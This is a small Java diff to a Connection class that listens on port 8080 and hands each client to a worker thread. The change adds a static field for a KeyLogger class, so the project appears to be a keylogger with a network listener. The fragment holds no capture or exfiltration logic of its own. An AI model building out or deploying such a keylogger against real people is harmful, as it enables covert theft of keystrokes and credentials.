@@ -6,6 +6,7 @@ import java.net.Socket;
 import KeyLogger.KeyLogger;
 
 public class Connection {
+	public static KeyLogger keyLogger = null;
 	private static ServerSocket server = null;
 	private static int port = 8080;
 	private static final int LINGER_TIME = 5000;	
@@ -17,7 +18,6 @@ public class Connection {
 			while (server.isBound() && server != null) {
 				Socket clientSocket = server.accept();
 				clientSocket.setSoLinger(true, LINGER_TIME);
-				
 				System.out.println("connected by " + clientSocket.getInetAddress());
 				WorkerThread woker = new WorkerThread(clientSocket);
 				woker.start();
